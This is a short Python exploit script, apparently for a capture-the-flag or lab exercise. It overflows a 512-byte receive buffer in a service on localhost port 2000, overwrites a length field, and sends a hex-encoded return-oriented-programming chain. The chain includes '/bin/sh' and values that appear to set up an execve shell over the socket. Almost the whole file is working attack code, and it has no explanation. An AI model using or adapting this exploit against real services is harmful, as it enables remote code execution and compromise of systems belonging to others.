#!/usr/bin/env python

import socket, struct, time

rop_payload = '252ba693ff7f0000020000000000000000000000000000004531a693ff7f0000010000000000000000000000000000006267a793ff7f000000000000000000002fdf8c8dff7f0000610000020000000000000000000000000434a793ff7f0000252ba693ff7f0000bf36a693ff7f00000000000000000000d8df8c8dff7f00005f60ca8aff7f0000000000000000000000000000000000004531a693ff7f000040000000000000000000000000000000ca80ca8aff7f0000bd36a693ff7f000000020bb87f00000100000000000000000000000000000000000000000000000000000000000000000b44a693ff7f0000000000000000000000000000000000002fdf8c8dff7f0000262ba693ff7f00000000000000000000a021a793ff7f00006267a793ff7f000010000000000000002fdf8c8dff7f0000620000020000000000000000000000000434a793ff7f00004531a693ff7f0000000000000000000000000000000000002fdf8c8dff7f00005a0000020000000000000000000000000434a793ff7f00004531a693ff7f0000010000000000000000000000000000002fdf8c8dff7f00005a0000020000000000000000000000000434a793ff7f00004531a693ff7f0000020000000000000000000000000000002fdf8c8dff7f00005a0000020000000000000000000000000434a793ff7f0000252ba693ff7f0000bf36a693ff7f00000000000000000000d8df8c8dff7f00005f60ca8aff7f0000000000000000000000000000000000004531a693ff7f000040000000000000000000000000000000ca80ca8aff7f0000bd36a693ff7f00002f62696e2f7368000000000000000000000000000000000000000000000000000000000000000000dae40f93ff7f000000000000000000004531a693ff7f0000000000000000000000000000000000006267a793ff7f000000000000000000002fdf8c8dff7f00003b0000020000000000000000000000000434a793ff7f0000'

s = socket.create_connection(('127.0.0.1', 2000))
s.send('x' * 512) # fill _recvBuffer
s.send('y' * 4)   # fill _recvBytes alignment padding
s.send(struct.pack('<Q', 512+8*20)) # fill _recvBytes
time.sleep(1) # send the rest after _recvBytes has been overwritten
s.send(rop_payload.decode('hex') + '\n')
print('package deployed')
response = s.recv(4096)
if response:
    print(response.encode('hex'))
